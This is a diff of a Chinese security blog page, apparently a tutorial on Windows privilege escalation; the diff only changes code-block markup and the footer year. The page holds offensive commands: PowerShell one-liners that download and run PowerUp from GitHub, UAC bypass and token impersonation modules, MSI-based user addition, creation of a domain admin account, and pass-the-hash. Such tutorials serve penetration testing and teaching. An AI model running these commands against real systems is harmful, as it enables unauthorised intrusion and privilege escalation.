@@ -192,9 +192,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">systeminfo
-wmic qfe get Caption,Description,HotfixID,InstalledOn
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">systeminfo
+</span></span><span class="line"><span class="cl">wmic qfe get Caption,Description,HotfixID,InstalledOn
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现补丁编号</p>
 <div class="highlight"><div class="chroma">
@@ -202,8 +202,8 @@ wmic qfe get Caption,Description,HotfixID,InstalledOn
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic qfe get Caption,Description,HotfixID,InstalledOn <span class="p">|</span> findstr C:<span class="s2">&#34;KB3143141&#34;</span> C:/<span class="s2">&#34;KB976902&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic qfe get Caption,Description,HotfixID,InstalledOn <span class="p">|</span> findstr C:<span class="s2">&#34;KB3143141&#34;</span> C:/<span class="s2">&#34;KB976902&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="windows-exploit-suggester">Windows Exploit Suggester</h3>
 <p>使用  <code>systeminfo</code> 命令获取当前系统的补丁安装状况，并将信息导入 <code>patches.txt</code> 文件中</p>
@@ -215,8 +215,8 @@ wmic qfe get Caption,Description,HotfixID,InstalledOn
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python windows-exploit-suggester.py --update
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python windows-exploit-suggester.py --update
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="2">
 <li>检查漏洞</li>
@@ -226,8 +226,8 @@ wmic qfe get Caption,Description,HotfixID,InstalledOn
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>Metasploit</code> 内置 <code>local_exploit_suggester</code> 模块</p>
 <h3 id="powershell-中的-sherlock-脚本">powershell 中的 sherlock 脚本</h3>
@@ -238,9 +238,9 @@ wmic qfe get Caption,Description,HotfixID,InstalledOn
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">Sherlock</span><span class="p">.</span><span class="n">ps1</span> 
-<span class="nb">Find-AllVulns</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="p">.\</span><span class="n">Sherlock</span><span class="p">.</span><span class="n">ps1</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">Find-AllVulns</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener noreffer">https://github.com/rasta-mouse/Watson</a></p>
 <h2 id="windows-配置错误利用">Windows 配置错误利用</h2>
@@ -252,16 +252,16 @@ wmic qfe get Caption,Description,HotfixID,InstalledOn
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp;{Import-Module .\PowerUP.ps1;Invoke-AllChecks}&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp;{Import-Module .\PowerUP.ps1;Invoke-AllChecks}&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -284,9 +284,9 @@ wmic qfe get Caption,Description,HotfixID,InstalledOn
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span><span class="line"><span class="cl">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果值均为 <code>1</code>，说明存在风险</p>
 <ul>
@@ -297,8 +297,8 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Get-RegistryAlwaysInstallElevated&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;);Get-RegistryAlwaysInstallElevated&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>添加账户</p>
 <div class="highlight"><div class="chroma">
@@ -306,8 +306,8 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Write-UserAddMSI</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Write-UserAddMSI</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>以普通用户运行</p>
 <div class="highlight"><div class="chroma">
@@ -315,8 +315,8 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">msiexec /q /i UserAdd.smi
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">msiexec /q /i UserAdd.smi
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>也可以利用 <code>msf</code> 中的 <code>always_install_elevated</code> 模块</p>
 <h3 id="可信任服务路径漏洞">可信任服务路径漏洞</h3>
@@ -329,8 +329,8 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic service get name,displayname,pathname,startmode<span class="p">|</span>findstr /i <span class="s2">&#34;Auto&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;C:\Windows\\&#34;</span><span class="p">|</span>findstr /i /v <span class="s2">&#34;&#34;&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic service get name,displayname,pathname,startmode<span class="p">|</span>findstr /i <span class="s2">&#34;Auto&#34;</span> <span class="p">|</span> findstr /i /v <span class="s2">&#34;C:\Windows\\&#34;</span><span class="p">|</span>findstr /i /v <span class="s2">&#34;&#34;&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>把要上传的程序重命名并放置在此漏洞且可写的目录下，执行如下命令：</li>
@@ -341,9 +341,9 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">sc stop service_name
-sc start service_name
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">sc stop service_name
+</span></span><span class="line"><span class="cl">sc start service_name
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>也可以使用 msf 中的 <code>Windows Service Trusted Path Privilege Escalation</code> 模块进行测试</li>
@@ -356,9 +356,9 @@ sc start service_name
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">dir</span> /b /s c:\Unattend.xml
-<span class="k">dir</span> /b /s c:\sysprep.xml
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /b /s c:\Unattend.xml
+</span></span><span class="line"><span class="cl"><span class="k">dir</span> /b /s c:\sysprep.xml
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看文件中知否存在 <code>base64</code> 加密的密码</p>
 <p>msf 中集成了该漏洞的利用模块 <code>post/windows/gather/enum_unattend</code></p>
@@ -369,8 +369,8 @@ sc start service_name
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">schtasks /query /fo LIST /v
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">schtasks /query /fo LIST /v
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="查询可写的计划任务文件夹">查询可写的计划任务文件夹</h4>
 <div class="highlight"><div class="chroma">
@@ -378,8 +378,8 @@ sc start service_name
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">accesschk.exe -dqc <span class="s2">&#34;C:\Microsoft&#34;</span> -accepteula
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">accesschk.exe -dqc <span class="s2">&#34;C:\Microsoft&#34;</span> -accepteula
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="列出某个驱动器下所有权限配置有缺陷的文件夹">列出某个驱动器下所有权限配置有缺陷的文件夹</h4>
 <div class="highlight"><div class="chroma">
@@ -388,9 +388,9 @@ sc start service_name
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">accesschk.exe -uwdqsUsersc:\
-accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">accesschk.exe -uwdqsUsersc:\
+</span></span><span class="line"><span class="cl">accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="列出某个驱动器下所有权限配置有缺陷的文件">列出某个驱动器下所有权限配置有缺陷的文件</h4>
 <div class="highlight"><div class="chroma">
@@ -399,9 +399,9 @@ accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">accesschk.exe -uwdqsUsersc:\*.*
-accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\*.*
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">accesschk.exe -uwdqsUsersc:\*.*
+</span></span><span class="line"><span class="cl">accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\*.*
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="empire-内置模块">Empire 内置模块</h3>
 <div class="highlight"><div class="chroma">
@@ -409,8 +409,8 @@ accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\*.*
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usermode privesc/powerup/xxxx
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">usermode privesc/powerup/xxxx
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="绕过-uac-提权">绕过 UAC 提权</h2>
 <h3 id="bypassuac-模块">bypassuac 模块</h3>
@@ -422,10 +422,10 @@ accesschk.exe -uwdqs<span class="s2">&#34;AuthenticatedUsers&#34;</span>c:\*.*
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">exploit/windows/local/bypassuac
-exploit/windows/local/bypassuac_inject
-getsystem
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exploit/windows/local/bypassuac
+</span></span><span class="line"><span class="cl">exploit/windows/local/bypassuac_inject
+</span></span><span class="line"><span class="cl">getsystem
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="runas-模块">RunAs 模块</h3>
 <div class="highlight"><div class="chroma">
@@ -433,8 +433,8 @@ getsystem
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">exploit/windows/local/ask
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exploit/windows/local/ask
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>弹出一个 UAC 框，用户点击后会弹回一个高权限的 shell</p>
 <div class="highlight"><div class="chroma">
@@ -442,8 +442,8 @@ getsystem
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">getuid 查看权限，如果是普通用户权限，执行 getsystem 提权
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getuid 查看权限，如果是普通用户权限，执行 getsystem 提权
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="nishang-中的-invoke-psuacme-模块">Nishang 中的 Invoke-PsUACme 模块</h3>
 <div class="highlight"><div class="chroma">
@@ -454,11 +454,11 @@ getsystem
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">Invoke-PsUACme -Verbose ## 使用Sysprep方法并执行默认的Payload
-Invoke-PsUACme -method oobe -Verbose ## 使用oobe方法方法并执行默认的Payload
-Invoke-PsUACme -Payload <span class="s2">&#34;powershell -windowstyle hidden -e YourEncodedPayload&#34;</span>
-## 使用-Payload参数，可以自行指定要执行的Payload
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Invoke-PsUACme -Verbose ## 使用Sysprep方法并执行默认的Payload
+</span></span><span class="line"><span class="cl">Invoke-PsUACme -method oobe -Verbose ## 使用oobe方法方法并执行默认的Payload
+</span></span><span class="line"><span class="cl">Invoke-PsUACme -Payload <span class="s2">&#34;powershell -windowstyle hidden -e YourEncodedPayload&#34;</span>
+</span></span><span class="line"><span class="cl">## 使用-Payload参数，可以自行指定要执行的Payload
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="empire-中的-bypassuac-模块">Empire 中的 bypassuac 模块</h3>
 <h4 id="bypassuac-模块-1">bypassuac 模块</h4>
@@ -468,9 +468,9 @@ Invoke-PsUACme -Payload <span class="s2">&#34;powershell -windowstyle hidden -e 
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">usemode privesc/bypassuac 
-execute
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">usemode privesc/bypassuac 
+</span></span><span class="line"><span class="cl">execute
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="bypassuac_wscript-模块">bypassuac_wscript 模块</h4>
 <div class="highlight"><div class="chroma">
@@ -479,9 +479,9 @@ execute
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">usemode privesc/bypassuac_wscript
-execute
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">usemode privesc/bypassuac_wscript
+</span></span><span class="line"><span class="cl">execute
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="令牌窃取">令牌窃取</h2>
 <h3 id="msf-上的令牌窃取">msf 上的令牌窃取</h3>
@@ -492,9 +492,9 @@ execute
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">use incognito
-list_tokens -u
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">use incognito
+</span></span><span class="line"><span class="cl">list_tokens -u
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 <code>incognito</code> 中调用 <code>impersonate_token</code></p>
 <div class="highlight"><div class="chroma">
@@ -502,8 +502,8 @@ list_tokens -u
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">impersonate_token DESKTOP-DUNPKQ9\\Administrator
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">impersonate_token DESKTOP-DUNPKQ9\\Administrator
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>注意</code>：在输入主机名 <code>\</code> 用户名时，需要输入两个反斜杠</p>
 <h3 id="rotten-potato-本地提权">Rotten Potato 本地提权</h3>
@@ -515,11 +515,11 @@ list_tokens -u
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use incognito
-list_tokens -u
-execute -HC -f rottenpotato.exe
-impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use incognito
+</span></span><span class="line"><span class="cl">list_tokens -u
+</span></span><span class="line"><span class="cl">execute -HC -f rottenpotato.exe
+</span></span><span class="line"><span class="cl">impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="添加域管理员">添加域管理员</h3>
 <p>假设网络中设置了域管进程，在 <code>meterpreter shell</code> 中迁移进程至域管进程中</p>
@@ -529,9 +529,9 @@ impersonate_token &#34;NT AUTHORITY\\SYSTEM&#34;
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net user test test123!@# /ad /domain
-net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user test test123!@# /ad /domain
+</span></span><span class="line"><span class="cl">net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>同样，在 <code>meterpreter shell</code> 中可以使用 <code>incognito</code> 来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员。</p>
 <p>在活动的  <code>meterpreter shell</code> 中执行如下命令：</p>
@@ -540,8 +540,8 @@ net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">add_user test test!@#123 -h 1.1.1.2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_user test test!@#123 -h 1.1.1.2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行如下命令，将该账户加到域管理员组中。</p>
 <div class="highlight"><div class="chroma">
@@ -549,8 +549,8 @@ net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">add_user &#34;Domain Admins&#34; test -h 1.1.1.2
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add_user &#34;Domain Admins&#34; test -h 1.1.1.2
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="empire-下的令牌窃取分析">Empire 下的令牌窃取分析</h3>
 <p>运行 <code>mimikatz</code>，输入 <code>creds</code></p>
@@ -560,8 +560,8 @@ net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">pth CredID
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pth CredID
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="无凭证下的权限获取">无凭证下的权限获取</h2>
 <h3 id="llmnr-和-netbios-欺骗攻击">LLMNR 和 NetBIOS 欺骗攻击</h3>
@@ -595,7 +595,7 @@ net group <span class="s2">&#34;domain admins&#34;</span> test /ad /domain
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
